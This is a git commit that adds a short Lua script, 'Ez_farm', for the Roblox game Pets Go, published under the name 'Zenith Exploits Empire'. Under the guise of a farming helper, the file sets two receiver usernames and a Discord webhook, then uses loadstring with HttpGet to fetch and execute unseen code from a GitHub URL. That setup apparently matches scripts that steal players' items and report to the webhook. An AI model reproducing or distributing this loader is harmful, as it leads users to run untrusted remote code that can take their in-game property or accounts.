04e0b6f22353bd7bf15ac2dff0fd07e59b4708b2
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 10:41:02 +0200

    Added petsgo script: Ez_farm

---
+++ pets go/Ez_farm.lua
@@ -0,0 +1,5 @@
+Username = "Jatinking243"
+Username2 = "Jatinking233"
+Webhook = "https://discord.gg/j2cWpT87"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
